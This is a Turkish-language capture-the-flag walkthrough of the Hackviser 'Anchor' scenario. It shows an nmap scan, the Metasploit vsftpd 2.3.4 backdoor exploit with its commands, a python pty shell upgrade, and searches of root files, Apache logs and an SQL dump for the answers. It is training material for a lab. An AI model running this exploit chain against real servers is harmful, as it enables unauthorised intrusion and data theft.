## Her CTF çözümünde böyle giriş yapmıyacağımı söyleyerek'ten şuan hackviser'daki anchor seneryasonun çözümüne bakacağız

# [ANCHOR](https://app.hackviser.com/scenarios/anchor)

- CTF GÖRSELİ
<img width="1400" height="700" alt="image" src="https://github.com/user-attachments/assets/e0de9fc6-6c2e-42d3-90dd-f8194a97e97e" />
<br>

Öncelikle her ctf'dede yapıldığı gibi nmap'imizi atmadan önce sorularımızı tanıyalım

1. Bugüne kadar kaç adet dosya transfer edilmiştir?
2. Veri satışından gelen paranın aktarılacağı IBAN adresi nedir?
3. Şirketin verilerinin bulunduğu dosya hangi ip adresinden yüklenmiştir?
4. Sızdırılan verilerdeki admin kullanıcısının parolası nedir?

Sorularımız bunlardan ibaret ilk soru için makinemizi açıp sayfaya girmemiz yeterli olacaktır, çünkü cevap kabak gibi ortada

<img width="1366" height="615" alt="VirtualBox_kali-linux-2025 4-virtualbox-amd64_14_04_2026_19_03_02" src="https://github.com/user-attachments/assets/e02a9189-d295-49fa-8ea6-34ca5ac3e838" />

<hr>

## 1.Sorumuzun cevabına bulduğumuza göre, diğer cevaplar için makineye sızmamız gerek çünkü sayfamız statik ve içinde bir bilgi yok bunun için port taraması gerçekleştiriyoruz
```
nmap -sV -p 22,21,80,443 [IP/Domain]
/Taramada kullandığımız parametreleri bilmiyorsanız öğrenmeniz gerek ama genede minik birşekilde/
-sV = Kullanılan teknolojilerin sürümleriyle beraber
-p  = Belirtili bir port aralığını
```
<img width="1352" height="546" alt="image" src="https://github.com/user-attachments/assets/b010f77b-1c06-46c2-830c-5f187a4c3212" />

Taramamızın sonucu olarak bu resimde değinmemiz gereken çok önemli bir nokta var 3 ok'tan en önemlisi **vsftpd 2.3.4** bu ctf'lerin en sevdiği zafiyet dolu bir sürümdür bizde böyle yaparak sisteme sızacağız bunun için 2.durak olarak "msfconsole"a uğruyoruz

```
msfconsole
```
```
search vsftpd 2.3.4
```
<img width="1354" height="344" alt="image" src="https://github.com/user-attachments/assets/c4387ffc-3506-41c4-9851-65103bc2bc63" />

### VE BİNGO

Tam olarakta dediğimiz gibi bu sürümün bir zafiyeti var gerisi artık çocuk oyuncağı

```
use 0 
```
İle payloadımızı seçtikten sonra hemen ardından

```
show options
```
Bu kod satırı ile bizden istenen verilere bakıyoruz

<img width="1357" height="585" alt="image" src="https://github.com/user-attachments/assets/8fb55c5b-3227-4657-863a-45409cd64758" />

Burada dikdörtgen içine aldığım kısımdan gerekli olup olmadığını "Yes" olarak doğruladığımız 2 ayar içinde şu komutları yazıcaz ama ondan önce 2sininde ne işe yaradığını açıklıyalım

RHOSTS = Burası saldıracağınız makinenin IP adresi

RPORT = Burasıda saldıracağınız portu göstermekte

```
set RHOSTS [IP]
```
```
set RPORT 21 // Burayı yapmasanızda olur çünkü default olarak ftp portu 21'de çalışır //
```
Sonrasını aslında biliyorsunuz :) run yada exploit diyerek payloadı başlatın

<img width="1357" height="114" alt="image" src="https://github.com/user-attachments/assets/20bc1e35-5748-41dd-aabf-3fc7aa7f628e" />

Böyle bir uyarıda AAAA yazıp bir daha run diyebilirsiniz

<img width="1352" height="187" alt="image" src="https://github.com/user-attachments/assets/0fbf5340-6f79-417d-913f-6de67aa155d1" />

Ve artık içerdeyiz yetkimiz tam yetki yani "/" (root) buradan sonra gezinmekte sıramız ama ondan önce bu çok kötü lanet olası basic shell'i bi kenara bırakıp
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
ile gelişmiş bir shell'e geçelim

### Böyle CTF'lerde hep root'sanız ilk root'a bakmanız gerektiğini bilin (Yoksa ben gibi 4 saat boyunca ararsınız :] )

<img width="944" height="480" alt="image" src="https://github.com/user-attachments/assets/73ea2126-8f11-448d-a5c5-37446b6d5fc3" />
<br>
<br>

```
cd root
```

```
ls -la
```

İle bir WhatsappChat.txt görmekteyiz cat ile dosyayı kontrol ettiğimizde

```
cat WhatsappChat.txt
```

>[Admin] (555-123-4567)
: Hi Robert, is everything going smoothly? Where is the site data being stored?
>
>[Robert] (555-789-0123)
: Hi. Everything is going well. We are backing up the data on the server, but some files are catching our interest. We are currently copying some data.
>
>[Admin] (555-123-4567)
: Great. How much data have we stolen so far?
>
>[Robert] (555-789-0123)
: We have a substantial amount of data right now. We are working on user information and files. We are also decrypting encrypted files.
>
>[Admin] (555-123-4567)
: Perfect. How can we sell the backed-up data to others? Finding a secure buyer is important.
>
>[Robert] (555-789-0123)
: Yes, we are in talks with a few buyers. They know how to handle the data securely.
>
>[Admin] (555-123-4567)
: Good. How can we expand the data we are collecting?
>
>[Robert] (555-789-0123)
: We can enhance the database by collecting more information. We have identified target users.
>
>[Admin] (555-123-4567)
: Understood. It’s also crucial to obtain the identity information of users. We need to make the most of the data we have.
>
>[Robert] (555-789-0123)
: Absolutely. We are also using some specialized tools to open encrypted files. It’s making our job easier.
>
>[Admin] (555-123-4567)
: You’re doing a great job. This data will be valuable to us. Providing updated and high-quality data is important.
>
>[Robert] (555-789-0123)
: Definitely. Everything is going smoothly. Let me know if you need anything extra.
>
>[Admin] (555-123-4567)
: Okay. Good work. Keep me updated on the status.
>
>[Robert] (555-789-0123)
: Thanks. I’ll keep you informed.
>>
>>[Admin] (555-123-4567)
: By the way, make sure to transfer the funds to our account once the data is sold. Here is the IBAN: _DE*****************_. [2.Sorunuzun cevabı]
>>
>[Robert] (555-789-0123)
: Got it. I’ll make sure the funds are transferred to the given IBAN as soon as possible.

Yukarda geçen mesajlarmanın sonundaki IBAN dikkatimizi çekerek 2.Sorumuzun cevabını bulmuş oluyoruz
<hr>

## 3.Sorumuz için sitemizin log'larını bulmamız gerek bunun için google abiye log'ları nereden bulabilirim diye soruyorum

<img width="860" height="637" alt="image" src="https://github.com/user-attachments/assets/e9546de3-e1b3-49e8-9e10-d49f3245fc6a" />

Oda bana "/var/log/apache2/" yerini gösteriyor ve access.log'da benim bu siteye erişenlerin bilgileri yazmakta

<img width="1355" height="286" alt="image" src="https://github.com/user-attachments/assets/1670f673-d76d-4aad-abab-8f283fc57027" />

### Hatta burada nmap attığımız gözüküyor <:

<br>

Onun için araştırmaya devam ediyoruz

<img width="562" height="223" alt="image" src="https://github.com/user-attachments/assets/b117d247-3637-47e3-94d9-577aa1a473a6" />

Burada uploads.log diye bir belgeye erişiyoruz bunuda cat' ile açarsak 3.Sorumuzun cevabını bulmus oluyoruz

<img width="627" height="341" alt="image" src="https://github.com/user-attachments/assets/0831be2c-0028-4dcb-942b-3abce2283471" />

Kırmızı dikdörtgenin içindeki ilk IP bizim 3.sorumuzun cevabını sağlıyor

<hr>

## 4.Soru içinse bu sql'in nerede saklandığını bulmamız gerekecektir onun için aşağıdaki kod ile yerini tespit ediyoruz

```
find / -name "nexcorp.sql" 2>/dev/null
```
<img width="633" height="104" alt="image" src="https://github.com/user-attachments/assets/f905bb42-6733-4619-af78-1a80a542b585" />

Lokasyona gidip bu sql'in içinde yatıyor // Ben kendim çözerken sql'i direk server açıp makineme indirmiştim fakat siz "cat" ile yapabilirsiniz

<img width="1364" height="646" alt="image_6" src="https://github.com/user-attachments/assets/428e80bb-57fd-4692-a90a-61b3507f8c0e" />

Ve şuan son soru için admin passwordunu soruyordu satırda gördüğünüz son kısım adminin şifresi olacaktır

<hr>

### HERŞEY BU KADAR GOD'A EMANET OLUN BAŞKA CTF'LERDE GÖRÜŞMEK ÜZERE

<hr>
